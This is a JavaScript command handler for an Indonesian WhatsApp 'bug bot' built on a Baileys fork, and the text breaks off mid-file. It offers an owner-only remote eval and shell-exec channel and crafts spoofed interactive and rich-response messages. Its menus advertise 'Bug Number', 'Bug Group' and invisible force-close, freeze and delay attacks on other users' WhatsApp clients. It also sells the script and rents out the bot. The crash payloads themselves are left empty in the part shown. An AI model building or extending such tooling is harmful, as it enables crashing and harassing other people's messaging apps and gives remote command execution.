/*
━━━━━━━━━━━━━━━━━━━━
     SATZNUXIL LICENSE
━━━━━━━━━━━━━━━━━━━━

Base Name : SatzNuxil-Base
Developer : SatzNuxil 
Telegram  : t.me/iamsatzZX

[ RULES BASE SATZNUXIL! ]

× NO SELL BASE FREE!
× JANGAN MENGHAPUS CREDIT 
× JIKA MEMAKAI HARUS MENCANTUMKAN DEVELOPER

_THANKS USE MY SCRIPT BASE _
© SatzNuxil - 
━━━━━━━━━━━━━━━━━━━━
*/

const baileys = require('@rexxhayanasi/elaina-baileys')

const {
    default: makeWASocket,
    proto,
    generateWAMessageFromContent,
    generateWAMessage,
    generateWAMessageContent,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    jidNormalizedUser,
    getContentType,
    fetchLatestBaileysVersion,
    useSingleFileAuthState,
    makeInMemoryStore,
    DisconnectReason,
    Browsers
} = baileys

const os = require('os');
const util = require('util');
const fs = require('fs');
const crypto = require("crypto");
const path = require('path');
const sharp = require('sharp')
const { exec } = require('child_process');
const { fileTypeFromBuffer } = require('file-type');
const { writeExif } = require('./lib/StickerMaker.js');
const axios = require("axios");
const config = require('./config.json');
const ownerPath = path.join(__dirname, 'database', 'owner.json');
const premiumPath = path.join(__dirname, 'database', 'premium.json');

const readJSON = (file) => {
    try {
        if (!fs.existsSync(file)) fs.writeFileSync(file, '[]');
        return JSON.parse(fs.readFileSync(file));
    } catch {
        return [];
    }
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

const getNumber = (jid = '') => String(jid).split('@')[0].replace(/\D/g, '');

const isCreator = (m) => {
    const sender = getNumber(m.sender);
    const creator = String(config.ownerNumber || '').replace(/\D/g, '');
    return sender === creator;
};

const isOwner = (m) => {
    const sender = getNumber(m.sender);
    const ownerDB = readJSON(ownerPath);
    const creator = String(config.ownerNumber || '').replace(/\D/g, '');
    return sender === creator || ownerDB.includes(sender);
};

const isPremium = (m) => {
    const sender = getNumber(m.sender);
    const premiumDB = readJSON(premiumPath);
    return isOwner(m) || premiumDB.includes(sender);
};

// System executeEval
const executeEval = async (code, conn, m) => {
    try {
        let result

        if (code.includes('\n') || code.includes(';')) {
            result = await eval(`
                (async (conn, m, require, fs, util) => {
                    ${code}
                })(conn, m, require, fs, util)
            `)
        } else {
            result = await eval(`
                (async (conn, m, require, fs, util) => {
                    return (${code})
                })(conn, m, require, fs, util)
            `)
        }

        if (typeof result !== 'string') {
            result = util.inspect(result, {
                depth: 1
            })
        }

        m.reply(result || 'undefined')
    } catch (e) {
        m.reply(String(e))
    }
}

//System Detect id all Button, id button gapake titik (.)
const extractCommandFromMessage = (m) => {
    let body = '';
    let isButtonResponse = false;
    try {
        if (m.message) {
            if (m.message.conversation) body = m.message.conversation;
            else if (m.message.extendedTextMessage?.text) body = m.message.extendedTextMessage.text;
            else if (m.message.imageMessage?.caption) body = m.message.imageMessage.caption;
            else if (m.message.videoMessage?.caption) body = m.message.videoMessage.caption;
            else if (m.message.documentMessage?.caption) body = m.message.documentMessage.caption;
            else if (m.message.interactiveResponseMessage) {
                const inter = m.message.interactiveResponseMessage;
                if (inter.nativeFlowResponseMessage) {
                    const flow = inter.nativeFlowResponseMessage;
                    if (flow.paramsJson) {
                        try {
                            const params = JSON.parse(flow.paramsJson);
                            body = params.id || params.buttonId || params.rowId || params.index || '';
                        } catch { body = flow.name || ''; }
                    } else body = flow.name || '';
                    isButtonResponse = true;
                } else if (inter.buttonReply) {
                    body = inter.buttonReply.selectedButtonId || '';
                    isButtonResponse = true;
                } else if (inter.singleSelectReply) {
                    body = inter.singleSelectReply.selectedRowId || '';
                    isButtonResponse = true;
                }
            } else if (m.message.templateButtonReplyMessage) {
                body = m.message.templateButtonReplyMessage.selectedId || '';
                isButtonResponse = true;
            } else if (m.message.buttonsResponseMessage) {
                body = m.message.buttonsResponseMessage.selectedButtonId || '';
                isButtonResponse = true;
            }
        }
    } catch (error) {
        console.error('Error parsing message:', error);
    }
    return { body, isButtonResponse };
};




module.exports = async (conn, m) => {
    try {
        const { body, isButtonResponse } = extractCommandFromMessage(m);
        if (!body) return;
        if (body) m.text = body;

        let command = '';
        let args = [];

        if (isButtonResponse) {
            const parts = body.trim().split(/ +/);
command = parts[0].toLowerCase();
args = parts.slice(1);
        } else {
            const trimmed = body.trim();
            if (trimmed.startsWith(']>')) {
                if (!isCreator(m)) return m.reply('Perintah eval hanya untuk creator.');
                const evalCode = trimmed.slice(2).trim();
                if (!evalCode) return m.reply('Contoh:\n]> 1+1');
                return await executeEval(evalCode, conn, m);
            }
            if (trimmed.startsWith('$')) {
                if (!isCreator(m)) return m.reply('❌ Perintah shell hanya untuk creator.');
                const shellCmd = trimmed.slice(1).trim();
                if (!shellCmd) return m.reply('Contoh: $ ls -la');
                m.reply('⏳ Menjalankan perintah shell...');
                exec(shellCmd, { timeout: 30000, maxBuffer: 5 * 1024 * 1024 }, (error, stdout, stderr) => {
                    let output = stdout || stderr || error?.message || '✅ Selesai (tidak ada output)';
                    if (output.length > 2000) output = output.slice(0, 2000) + '\n... (output dipotong)';
                    m.reply(`💻 Output:\n${output}`);
                });
                return;
            }
            if (body.startsWith(config.prefix || '')) {
                const cleanBody = body.trim();
const parts = cleanBody.split(/ +/);

command = parts[0].toLowerCase();
args = parts.slice(1);
            } else {
                return;
            }
        }
      

        const { reply } = m;

        const thumb = await sharp('./src/img/menu.jpg')
        .resize(300, 300)
        .jpeg({ quality: 80 })
        .toBuffer()

       // Self
       if (config.mode === 'self' && !isCreator(m)) return
        
        const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: thumb,
      itemCount: "991111199",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

async function payreply(teks) {
const ppuser = "https://files.catbox.moe/uvlm9q.jpg"; 
return conn.sendMessage(
m.chat, { text: `${teks}`, contextInfo: { 
mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, 
title: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁", 
body: "Satz-Beginner", 
previewType: "PHOTO" }}}, 
{ quoted: lol })}
        
        
        
        ///////////////////////////////////////////////////////////
        ////////////////// FUNTION BUG IN HERE ///////////
       ///////////////////////////////////////////////////////////
        
        
        
        
        
                ///////////////////////////////////////////////////////////
        ////////////////// End funct bug ///////////
       ///////////////////////////////////////////////////////////
       //Case
        switch (command) {
               //// CRM 
           case "crm":
case "createrelaymessage": {
try {
const fs = require("fs");
const path = require("path");

const DB_FILE = path.join(
  process.cwd(),
  "crm_db.json"
);

// =========================================
// DATABASE
// =========================================

function loadDB() {
  if (!fs.existsSync(DB_FILE)) {
    return {
      messages: {}
    };
  }

  try {
    return JSON.parse(
      fs.readFileSync(DB_FILE, "utf8")
    );
  } catch {
    return {
      messages: {}
    };
  }
}

function saveDB(db) {
  fs.writeFileSync(
    DB_FILE,
    JSON.stringify(db, null, 2),
    "utf8"
  );
}

// =========================================
// SERIALIZE RAW MESSAGE
// =========================================

function serialize(value, seen = new WeakSet()) {

  if (value === null) {
    return null;
  }

  if (value === undefined) {
    return null;
  }

  if (typeof value === "bigint") {
    return {
      __type: "bigint",
      value: value.toString()
    };
  }

  if (Buffer.isBuffer(value)) {
    return {
      __type: "Buffer",
      value: value.toString("base64")
    };
  }

  if (value instanceof Uint8Array) {
    return {
      __type: "Buffer",
      value: Buffer.from(value).toString("base64")
    };
  }

  if (
    typeof value === "string" ||
    typeof value === "number" ||
    typeof value === "boolean"
  ) {
    return value;
  }

  if (Array.isArray(value)) {
    return value.map(item =>
      serialize(item, seen)
    );
  }

  if (typeof value === "object") {

    if (seen.has(value)) {
      return {
        __type: "circular"
      };
    }

    seen.add(value);

    const result = {};

    for (const [key, val] of Object.entries(value)) {
      if (typeof val === "function") continue;

      result[key] = serialize(
        val,
        seen
      );
    }

    return result;
  }

  return null;
}

// =========================================
// DESERIALIZE
// =========================================

function deserialize(value) {

  if (!value || typeof value !== "object") {
    return value;
  }

  if (
    value.__type === "Buffer"
  ) {
    return Buffer.from(
      value.value,
      "base64"
    );
  }

  if (
    value.__type === "bigint"
  ) {
    return BigInt(value.value);
  }

  if (
    value.__type === "circular"
  ) {
    return undefined;
  }

  if (Array.isArray(value)) {
    return value.map(deserialize);
  }

  const result = {};

  for (const [key, val] of Object.entries(value)) {
    result[key] = deserialize(val);
  }

  return result;
}

// =========================================
// RAW MESSAGE
// =========================================

const rawMessage =
  m?.message ||
  m?.msg ||
  null;

if (!rawMessage) {
  return m.reply(
    "❌ Raw message tidak ditemukan."
  );
}

// =========================================
// MESSAGE ID
// =========================================

const messageId =
  m?.key?.id ||
  `${Date.now()}_${Math.random()
    .toString(36)
    .slice(2)}`;

// =========================================
// SIMPAN RAW KE DB
// =========================================

const db = loadDB();

db.messages[messageId] = {
  id: messageId,

  chat:
    m?.chat ||
    m?.key?.remoteJid ||
    null,

  sender:
    m?.sender ||
    m?.key?.participant ||
    null,

  timestamp:
    Date.now(),

  types:
    Object.keys(rawMessage),

  raw:
    serialize(rawMessage)
};

saveDB(db);

// =========================================
// AMBIL RAW KEMBALI
// =========================================

const stored =
  db.messages[messageId];

const restoredRaw =
  deserialize(
    stored.raw
  );

// =========================================
// DEBUG OUTPUT
// =========================================

const output = `/*

* CRM RAW MESSAGE
* ID: ${messageId}
* Chat: ${m?.chat || ""}
* Types: ${Object.keys(restoredRaw).join(", ")}
  */

const rawMessage = ${JSON.stringify(
stored.raw,
null,
2
)};

console.dir(rawMessage, {
depth: null
});
`;

const fileName =
  `CRM_RAW_${messageId}.js`;

fs.writeFileSync(
  fileName,
  output,
  "utf8"
);

await conn.sendMessage(
  m.chat,
  {
    document:
      fs.readFileSync(fileName),

    mimetype:
      "application/javascript",

    fileName
  },
  {
    quoted: m
  }
);

fs.unlinkSync(fileName);

} catch (err) {

console.error(
  "[CRM DB ERROR]",
  err
);

await m.reply(
  "❌ CRM DB ERROR\n\n" +
  (err.stack || err.message)
);

}

break;
}

            
                
        
case "menu": {
  const target = m.chat;

  await conn.relayMessage(target, {

    interactiveMessage: {

      // =========================================
      // HEADER IMAGE
      // =========================================

      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11864253_1613035743875896_2727826818010567577_n.enc?ccb=11-4&oh=01_Q5Aa5QH1AnVmcvwnZ_o_M-IXcjEPi1CW-W6IC_gi9y3CYUpUYA&oe=6ABCAC2D&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "nlze9MnBtcJxvspB6MrYw94DWl2R68efw2uZrQIlgPA=",
          fileLength: "288038",
          height: 1254,
          width: 1254,
          mediaKey: "UZ3D1614jO+yDcr+P4r2WG7y6LRk4MADPV5f+MLmgmY=",
          fileEncSha256: "Xgg5zEPgqS+ZiKcwQDVei877M6Bq8ASmtxDTSYKQLvE=",
          directPath: "/v/t62.7118-24/11864253_1613035743875896_2727826818010567577_n.enc?ccb=11-4&oh=01_Q5Aa5QH1AnVmcvwnZ_o_M-IXcjEPi1CW-W6IC_gi9y3CYUpUYA&oe=6ABCAC2D&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1788163668",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAgMBBAUGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAAD51Klsnvjszv5u9wj3R5TE05h3ct+qP63n08tJ0WD+x085+ZNMUebdKwQge0Npv2edEKnMGW0cgujwt6pTrturIziECgSaBSYAOoUgEH//xAAoEAACAgICAQMEAgMAAAAAAAABAgADESESMQQTIkEUIzJREGFSYnH/2gAIAQEAAT8AZs/GP4xBWxEFQ9M/5ZiUOd40Jc2ToahME4KAwY+4dRUBOAYqqpH6hGW9pJ/uCgspb1FzLEsTUWtWASw4z0ZbS1T47mS2orShA1ZVCA57ltNla+7oxfFuZAW9qiC0VWL3gdxvIDsyrpDClhHJgQITbYMYIAGjOCBSWMWsFkx8wlluJQ/9lSVeXTlvieZeOXpJoCNX6gA5CeKgS9BokmeZ51VVoT0FeVX+N5XjFnrwFlzJzIrHtlLgqq8d51OHpl+Y3DbcBj8Vj/eH+y/MS3gnBSMmUJxt5LvA3G8S661rGIAlr0U+N6VbDJ7MtrApRsieMEX7jt10JY5cs4PU4X2L+xAt1RGpZWTxITDRfqQCfgHcY+XbPTOMlhqO3KAsBxg48MY3BYcYLEQ2b7Jn1C8OjyhsPRY7nMgcQ5nFdEHX6mhnOQZt8kmLs6MbBH9wgzGNY3PyRQQBic1VTrc5DOdw8SucnlCMTQgb4hM56xAZ2IpAO+oeJE//xAAfEQEAAwACAwADAAAAAAAAAAABAAIRITEDEkEQQlH/2gAIAQIBAT8A5YVlvHUBJbxobvEeiV2vyDXXZljn9ZssHyC+psfXcjceEMlUOuZawvBKsdr/ACNrOdRcizZ7OTZZ6fx//8QAHREBAQABBAMAAAAAAAAAAAAAAQARAhAhQSAxcf/aAAgBAwEBPwDZ0nE6UM7eoSxqPmzdXFnqJYZlWcef/9k=",
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            mediaDomainInfo: {
              mediaKeyDomain: "MEDIA_KEY_DOMAIN_E2EE",
              e2EeMediaKey:
                "UZ3D1614jO+yDcr+P4r2WG7y6LRk4MADPV5f+MLmgmY="
            }
          },
          scansSidecar:
            "JpH6YKCHTSoyaEXW0PVVpTskNpXlR9oqwbzOpxneVM0cOM6o6rqvwg==",
          scanLengths: [
            20598,
            151559,
            48819,
            67062
          ],
          midQualityFileSha256:
            "G17lGG7H2EO3kEb18HOhsAPtVn0jwKXV41fCLonsObA="
        },

        hasMediaAttachment: true
      },

      // =========================================
      // BODY
      // =========================================

      body: {
        text: ""
      },

      // =========================================
      // NATIVE FLOW
      // =========================================

      nativeFlowMessage: {

        messageParamsJson: JSON.stringify({

          limited_time_offer: {
            text: "WaBot¿",
            url: "t.me/mynamesatzera",
            copy_code: "SatzIsteam",
            expiration_time: 1788088958981
          },

          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [
              1,
              2,
              3,
              4,
              5,
              999
            ],
            list_title: "WaBot¿ Menu",
            icon: "REVIEW",
            button_title: "Menu WaBotz"
          }

        }),

        buttons: [

          // =====================================
          // BUTTON 1
          // =====================================

          {
            name: "single_select",

            buttonParamsJson: JSON.stringify({
            icon: "DOCUMENT",
              has_multiple_buttons: true
            })
          },

          // =====================================
          // BEST MENU
          // =====================================

          {
            name: "single_select",

            buttonParamsJson: JSON.stringify({

              title: "Menu WaBot¿",
              icon: "DOCUMENT",

              sections: [
                {
                  title: "",
                  highlight_label: "© BestMenu¿",

                  rows: [

                    {
                      title: "BugNumber👾",
                      description: "",
                      id: "bugnum"
                    },

                    {
                      title: "Bug In Place ⭐",
                      description: "",
                      id: "place"
                    },

                    {
                      title: "Bug Group 👥",
                      description: "",
                      id: "group"
                    }

                  ]
                }
              ],

              has_multiple_buttons: true
            })
          },

          // =====================================
          // OWNER
          // =====================================

          {
            name: "single_select",

            buttonParamsJson: JSON.stringify({

              title: "Owner WaBotz¿",
              icon: "LIKE",

              sections: [
                {
                  title: "",
                  highlight_label: "© Owner WaBotz¿",

                  rows: [

                    {
                      title: "OwnerBotz👑",
                      description: "",
                      id: "ownermenu"
                    },
                    {
                      title: "Thank To🌟",
                      description: "",
                      id: "tqto"
                    },
      {
                      title: "Sewa/Buy Bot",
                      description: "",
                      id: "sewa"
                    },
                  ]
                }
              ],

              has_multiple_buttons: true
            })
          },

          // =====================================
          // CHANNEL
          // =====================================

          {
            name: "cta_url",

            buttonParamsJson: JSON.stringify({
              icon: "REVIEW",
              display_text: "Channel WhatsApp",
              url: "https://whatsapp.com/channel/0029Va4K0PZ5a245NkngBA2M"
            })
          }

        ]
      },

      // =========================================
      // BLOKS WIDGET
      // =========================================

      bloksWidget: {

        uuid: "0cef4800-2ac7-4e30-930d-00bd0dcf87d7",

        data: JSON.stringify({

          version: "v0.9",

          createSurface: {

            surfaceId:
              "starcore-widget=0cef4800-2ac7-4e30-930d-00bd0dcf87d7",

            catalogId:
              "https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json",

            components: [

              // ===================================
              // ROOT
              // ===================================

              {
                id: "root",
                component: "Column",

                children: [
                  "card1",
                  "card2",
                  "button3"
                ]
              },

              // ===================================
              // CARD 1
              // ===================================

              {
                id: "card1",
                component: "Card",
                child: "card1_content"
              },

              {
                id: "card1_content",
                component: "Column",

                children: [
                  "card1_title",
                  "card1_text"
                ]
              },

              {
                id: "card1_title",
                component: "Text",
                text: "INFORMATION BOT",
                variant: "h2"
              },

              {
                id: "card1_text",
                component: "Text",

                text: `BASE BOT CREATED BY SATZ, THIS BASE BOT IS FOR PERSONAL USE, SO IT'S ANTI-MARKET, CONGRATULATIONS TO THOSE WHO HAVE PURCHASED THIS BASE BOT`,

                variant: "body"
              },

              // ===================================
              // CARD 2
              // ===================================

              {
                id: "card2",
                component: "Card",
                child: "card2_content"
              },

              {
                id: "card2_content",
                component: "Column",

                children: [
                  "card2_title",
                  "card2_text"
                ]
              },

              {
                id: "card2_title",
                component: "Text",
                text: "XzD Base",
                variant: "h2"
              },

              {
                id: "card2_text",
                component: "Text",

                text:
"┏━━〔 INFO BOT 〕━━⬣\n" +
                  "┃\n" +
                  "┃❍ Nama Bot : Night7\n" +
                  "┃❍ Developer : Satz\n" +
                  "┃❍ Type : Case\n" +
                  "┃❍ Version : 1.0\n" +
                  "┃\n" +
                  "┗━━━━━━━━━━━━━━⬣",

                variant: "body"
              },

              // ===================================
              // 3 BUTTON HORIZONTAL
              // ===================================

{
                id: "button3",
                component: "Button",
                child: "button3_text",
                variant: "borderless",

                action: {
                  call: "openUrl",
                  args: {
                    url: "https://t.me/mynamesatzera"
                  }
                }
              },

              {
                id: "button3_text",
                component: "Text",
                text: "owner WaBotz💫"
              }

            ]
          }

        }),

        type: "im_a2ui"
      }

    }

  }, {});
  break;
}

//// SLEECT VERSI BUG MENU
                
case "sewa": {

  const imageUrl =
    "https://files.catbox.moe/ld1a18.jpg";

  const imageResponse =
    await fetch(imageUrl);

  if (!imageResponse.ok) {
    throw new Error(
      "Gagal mengambil gambar: HTTP " +
      imageResponse.status
    );
  }

  const imageBuffer =
    Buffer.from(
      await imageResponse.arrayBuffer()
    );

  const imageBase64 =
    imageBuffer.toString("base64");

  const imageData =
    "data:image/jpeg;base64," +
    imageBase64;


  /*
   * ============================================
   * HTML
   * ============================================
   */

  const html = `<!DOCTYPE html>
<html lang="id">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,initial-scale=1">

<title>SC XZD</title>

<style>

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html,
body {
  width: 100%;
  margin: 0;
  padding: 0;
}

body {

  background:
    radial-gradient(
      circle at 50% 0%,
      #1b2850 0%,
      #0b0f1c 45%,
      #070a12 100%
    );

  color: white;

  font-family:
    Arial,
    Helvetica,
    sans-serif;

  padding:
    14px 10px 12px;

}


/* ==========================================
   MAIN
========================================== */

.store {

  width: 100%;

  max-width: 620px;

  margin:
    0 auto;

}


/* ==========================================
   HEADER
========================================== */

.header {

  text-align:
    center;

  margin-bottom:
    14px;

}

.title {

  font-size:
    24px;

  line-height:
    1.1;

  font-weight:
    900;

  letter-spacing:
    3px;

  color:
    #dce6ff;

  text-shadow:
    0 0 8px #6685ff,
    0 0 22px #3858ff;

}

.subtitle {

  margin-top:
    6px;

  padding-top:
    6px;

  display:
    inline-block;

  border-top:
    1px solid #3a4668;

  color:
    #8c9ac0;

  font-size:
    8px;

  letter-spacing:
    4px;

}


/* ==========================================
   PRODUCT GRID
========================================== */

.products {

  display:
    grid;

  grid-template-columns:
    repeat(2, minmax(0, 1fr));

  gap:
    10px;

}


/* ==========================================
   CARD
========================================== */

.card {

  min-width:
    0;

  overflow:
    hidden;

  padding:
    8px;

  border-radius:
    17px;

  background:
    linear-gradient(
      145deg,
      #171e30,
      #0c111d
    );

  border:
    1px solid #35446c;

  border-bottom:
    3px solid #536fae;

  box-shadow:
    0 8px 18px rgba(0,0,0,.45),
    inset 0 0 0 1px #10182b;

}


/* ==========================================
   IMAGE
========================================== */

.image-box {

  width:
    100%;

  height:
    125px;

  overflow:
    hidden;

  border-radius:
    13px;

  background:
    #080c15;

  border:
    1px solid #36456d;

  margin-bottom:
    9px;

}

.image-box img {

  width:
    100%;

  height:
    100%;

  display:
    block;

  object-fit:
    cover;

}


/* ==========================================
   PRODUCT TITLE
========================================== */

.product-title {

  display:
    flex;

  align-items:
    center;

  gap:
    4px;

  min-height:
    34px;

  color:
    #f0f4ff;

  font-size:
    13px;

  line-height:
    1.15;

  font-weight:
    800;

}

.product-title .icon {

  flex-shrink:
    0;

  font-size:
    12px;

}

.badge {

  margin-left:
    auto;

  flex-shrink:
    0;

  padding:
    5px 7px;

  border-radius:
    20px;

  font-size:
    7px;

  font-weight:
    800;

  color:
    #bfd0ff;

  background:
    #293a69;

  border:
    1px solid #5973b4;

}


/* ==========================================
   DESCRIPTION
========================================== */

.description {

  margin-top:
    5px;

  min-height:
    31px;

  display:
    flex;

  align-items:
    center;

  padding:
    7px;

  border-left:
    3px solid #6685d1;

  border-radius:
    0 9px 9px 0;

  background:
    #1a243c;

  color:
    #aab7d7;

  font-size:
    9px;

  line-height:
    1.2;

}


/* ==========================================
   FOOTER
========================================== */

.footer {

  margin-top:
    8px;

  padding-top:
    8px;

  border-top:
    1px dashed #34405d;

  display:
    flex;

  align-items:
    center;

  justify-content:
    space-between;

  gap:
    5px;

}


/* ==========================================
   PRICE
========================================== */

.price {

  display:
    flex;

  align-items:
    baseline;

  gap:
    2px;

  white-space:
    nowrap;

  padding:
    5px 8px;

  border-radius:
    30px;

  background:
    #202c49;

  border:
    1px solid #506493;

  color:
    #fff0b7;

  font-size:
    14px;

  font-weight:
    900;

}

.price small {

  color:
    #8e9bbb;

  font-size:
    8px;

  font-weight:
    500;

}

.price span {

  color:
    #8998ba;

  font-size:
    7px;

  font-weight:
    500;

}


/* ==========================================
   BUTTON
========================================== */

.button {

  padding:
    6px 10px;

  border-radius:
    30px;

  border:
    1px solid #6d89e2;

  background:
    linear-gradient(
      145deg,
      #4569d1,
      #27449d
    );

  color:
    white;

  font-size:
    9px;

  font-weight:
    800;

  white-space:
    nowrap;

}


/* ==========================================
   SEWA
========================================== */

.sewa {

  border-bottom-color:
    #8b72cf;

}

.sewa .badge {

  color:
    #ddd3ff;

  background:
    #4b3e73;

  border-color:
    #8069bd;

}

.sewa .description {

  border-left-color:
    #9077d3;

}


/* ==========================================
   FOOTER NOTE
========================================== */

.note {

  margin-top:
    12px;

  padding-top:
    9px;

  border-top:
    1px solid #25304a;

  text-align:
    center;

  color:
    #647394;

  font-size:
    7px;

  letter-spacing:
    2px;

}


/* ==========================================
   SMALL SCREEN
========================================== */

@media (max-width:420px) {

  body {
    padding:
      10px 7px;
  }

  .products {
    gap:
      7px;
  }

  .card {
    padding:
      7px;
    border-radius:
      15px;
  }

  .image-box {
    height:
      105px;
  }

  .product-title {
    font-size:
      11px;
  }

  .description {
    font-size:
      8px;
    padding:
      6px;
  }

  .price {
    font-size:
      12px;
    padding:
      4px 6px;
  }

  .button {
    font-size:
      8px;
    padding:
      5px 8px;
  }

  .badge {
    font-size:
      6px;
    padding:
      4px 5px;
  }

}

</style>

</head>

<body>

<div class="store">


  <!-- HEADER -->

  <div class="header">

    <div class="title">
      ⚡ SC · XZD
    </div>

    <div class="subtitle">
      ⚡ XENON ZONE DANGER ⚡
    </div>

  </div>


  <!-- PRODUCTS -->

  <div class="products">


    <!-- PRODUCT 1 -->

    <div class="card">

      <div class="image-box">

        <img
          src="${imageData}"
          width="100%"
          height="125"
          alt="Base WhatsApp XzD"
        >

      </div>


      <div class="product-title">

        <span class="icon">
          🤖
        </span>

        <span>
          Base WhatsApp XzD
        </span>

        <span class="badge">
          SC
        </span>

      </div>


      <div class="description">
        ⚙️ Full fitur · siap pakai
      </div>


      <div class="footer">

        <div class="price">

          <small>
            Rp
          </small>

          25k

        </div>


        <div class="button">
          🛒 Beli
        </div>

      </div>

    </div>


    <!-- PRODUCT 2 -->

    <div class="card sewa">

      <div class="image-box">

        <img
          src="${imageData}"
          width="100%"
          height="125"
          alt="Sewa Bot XzD"
        >

      </div>


      <div class="product-title">

        <span class="icon">
          🤖
        </span>

        <span>
          Sewa Bot XzD
        </span>

        <span class="badge">
          HARIAN
        </span>

      </div>


      <div class="description">
        📅 5k/hari · ready 24/7
      </div>


      <div class="footer">

        <div class="price">

          <small>
            Rp
          </small>

          5k

          <span>
            /hari
          </span>

        </div>


        <div class="button">
          🚀 Sewa
        </div>

      </div>

    </div>


  </div>


  <!-- NOTE -->

  <div class="note">
    ⚡ XENON ZONE DANGER · SC STORE ⚡
  </div>


</div>

</body>

</html>`;


  /*
   * ============================================
   * RELAY MESSAGE
   * ============================================
   */

  await conn.relayMessage(
    m.chat,
    {
      botForwardedMessage: {
        message: {
          richResponseMessage: {

            messageType: 1,

            submessages: [
              {
                messageType: 2,
                messageText:
                  "🎸 NOX GUITAR HERO"
              }
            ],

            unifiedResponse: {

              data: Buffer.from(
                JSON.stringify({

                  response_id:
                    "nox-guitar-hero-" +
                    Date.now(),

                  sections: [

                    {
                      view_model: {

                        primitive: {

                          __typename:
                            "GenAIaeacdsnwHtmlPrimitive",

                          payload:
                            html,

                          trusted_sources: [
                            global?.ownername ||
                            "Noxm007 Official"
                          ]

                        },

                        __typename:
                          "GenAISingleLayoutViewModel"

                      }

                    }

                  ]

                })
              ).toString("base64")

            },

            contextInfo: {

              forwardingScore:
                1,

              isForwarded:
                true,

              forwardOrigin:
                4

            }

          }

        }

      }

    },
    {}
  );
}
break;


case "bugnum": {
await conn.relayMessage(m.chat,{
interactiveMessage: {
body: { text: "PILIH VERSI BUG MENU NYA!" },
nativeFlowMessage: {
buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "Mode RichMessage",
                  id: "richbug"
                })
              },
 {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "Mode Widget",
                  id: "widgetmenu"
                })
              }
]
},
contextInfo: {
      quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
}
},{})
}
break;

case "richbug": {
const messageCode = `
  
const BUG = {
  title: "SATZ WA BUG",
  options: [
┏━━━〔 BUG NUMBER 〕━━━⬣
┃
┃ .xzdfc ( Force Close Invisible )
┃ .xzdfre ( Freeze Invisible )
┃ .adadas ( Delay Invisible )
┃
┗━━━━━━━━━━━━━━⬣
  ]
};

console.log("Satz Menu");
send.Message(BUG)
`;

  await conn.sendMessage(m.chat, {
    richMessage: {
      title: "BASE WA BUGZ",
      text: "Opstion Bug in here.",

      code: {
        language: "javascript",
        code: messageCode
      },
      
      productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
      
      table: [
      ["Name", "Versi", "Developer"],
      ["XzD Base", "1.0.0", "Satz"]
      ],

      tip: "Gunakan menu dengan bijak.",
      suggestions: [
        "menu ( Back To Menu )",
        "developer"
      ],

      footer: "Satz",
      contextInfo: {
      quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
    }
  });
  }
  break;

case "widgetmenu": {
                const crypto = require("crypto");
  const response_id = crypto.randomUUID();

  // =========================
  // LATEX
  // =========================

  const rvnz2 =
    "https://files.catbox.moe/ld1a18.jpg?v=" + Date.now();

  const text2 =
    "{{Rvnz2}}Revinza{{/Rvnz2}}\n";

  const inline_entities_2 = [
    {
      key: "Rvnz2",
      metadata: {
        latex_expression: "Revinza",
        latex_image: {
          url: rvnz2,
          width: 400,
          height: 400
        },
        font_height: 83.333,
